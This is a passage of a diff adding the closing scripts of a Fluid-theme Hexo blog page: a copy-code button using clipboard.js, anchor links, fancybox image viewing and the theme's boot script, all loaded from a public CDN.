+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
